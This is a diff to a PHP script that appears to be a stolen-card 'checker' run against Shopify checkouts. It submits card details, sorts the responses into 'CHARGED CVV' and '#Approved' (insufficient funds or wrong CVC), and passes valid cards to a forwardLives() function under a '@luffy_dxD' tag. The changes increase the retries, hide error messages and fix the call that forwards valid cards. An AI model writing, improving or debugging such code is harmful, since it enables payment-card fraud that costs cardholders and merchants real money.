@@ -65,7 +65,7 @@ $hostFull = $parsedUrl['scheme'] . '://' . $parsedUrl['host'];
 // echo ''. $hostFull .'';return;
 date_default_timezone_set('Asia/Jakarta');
 
-$ckkk = rand(11111,9999).".txt";
+$ckkk = "cookie/".rand(11111,9999).".txt";
 @unlink(''.$ckkk.'');;
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
     extract($_POST);
@@ -2300,7 +2300,7 @@ if (strpos($ccsx, "Shipping address")) {
 
  $z = 0;
     
-    while(strpos($response, "ProcessingReceipt") && $z<4){
+    while(strpos($response, "ProcessingReceipt") && $z<10){
     $z++;
         
     $gid = trim(strip_tags(getStr($response, '"id":"', '"')));
@@ -2335,11 +2335,8 @@ if (strpos($ccsx, "Shipping address")) {
 
     $response = curl_exec($ch);
     $body = $response;
-    if (curl_errno($ch)) {
-        echo 'Error: ' . curl_error($ch);
-    }
     curl_close($ch);
-    echo "<br><hr>$z => $gid";
+    // echo "<br><hr>$z => $gid";
     
 }
 
@@ -2410,7 +2407,7 @@ if (strpos($response, "thank_you") || (strpos($response, "/processing?completed=
     forwardLives("Shopify","CHARGED CVV $price");
 } else if (strpos($response, "INSUFFICIENT_FUNDS") || (strpos($response, "INCORRECT_CVC"))) {
     echo '#Approved ' . $ip . '「' . $errorMessage . ' : ' . $response_code . ' : @luffy_dxD」';
-    forwardLives("Shopify",$response_code $price);
+    forwardLives("Shopify","$response_code $price");
 } else {
     if (strpos($response, "ActionRequiredReceiptTimeout")) {
         $response_code = "ActionRequiredReceiptTimeout";
